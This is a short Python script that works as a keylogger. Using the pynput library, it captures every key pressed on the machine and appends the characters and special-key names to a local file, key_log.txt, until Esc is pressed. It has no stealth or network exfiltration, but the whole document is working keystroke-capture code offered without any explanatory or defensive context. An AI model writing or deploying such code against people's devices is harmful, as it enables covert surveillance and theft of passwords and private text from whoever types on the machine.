import pynput
from pynput.keyboard import Key, Listener

# Path to the file where the keystrokes will be logged
log_file_path = "key_log.txt"

def on_press(key):
    try:
        with open(log_file_path, 'a') as log_file:
            log_file.write(f'{key.char}')
    except AttributeError:
        with open(log_file_path, 'a') as log_file:
            if key == Key.space:
                log_file.write(' ')
            elif key == Key.enter:
                log_file.write('\n')
            elif key == Key.tab:
                log_file.write('\t')
            else:
                log_file.write(f'[{key}]')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
